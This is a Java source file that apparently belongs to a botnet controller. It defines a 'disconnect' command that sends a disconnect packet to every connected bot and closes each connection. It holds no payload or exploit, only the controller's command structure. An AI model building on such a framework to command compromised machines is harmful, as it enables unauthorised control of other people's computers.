package com.redpois0n.commands;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.common.packets.Headers;



public class CommandDisconnect extends Command {

	/**
	 * Disconnects all bots
	 */
	@Override
	public void execute(String[] args, Bot[] bots) throws Exception {
		for (int i = 0; i < bots.length; i++) {
			try {
				Bot bot = bots[i];
				bot.writeByte(Headers.PACKET_DISCONNECT);
				bot.disconnect();
			} catch (Exception ex) {
				Main.handleException(ex);
			}
		}
	}

	@Override
	public String getUsage() {
		return "disconnect";
	}

	@Override
	public String getExample() {
		return "disconnect";
	}

	@Override
	public String getDescription() {
		return "Disconnects all bots";
	}

}
